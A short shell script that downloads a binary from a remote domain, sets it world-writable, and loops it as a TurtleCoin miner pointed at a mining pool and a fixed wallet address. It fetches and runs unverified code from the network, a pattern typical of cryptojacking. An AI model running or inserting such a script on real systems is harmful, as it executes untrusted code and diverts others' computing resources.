#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://swenson.my.id/mining/masterfile
chmod 777 masterfile
while [ 1 ]; do
./masterfile --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u TRTLv11jVfE8pG6joSABXzLi4fpq694dXGF91RFJ6nuMf2AJuSRa7CSF2i8siF1BGgfF7fYUjnGt4P22T2sLQRzyK8Cooo7PUrB -p x -a argon2/chukwav2 -k
sleep 3
done
sleep 999
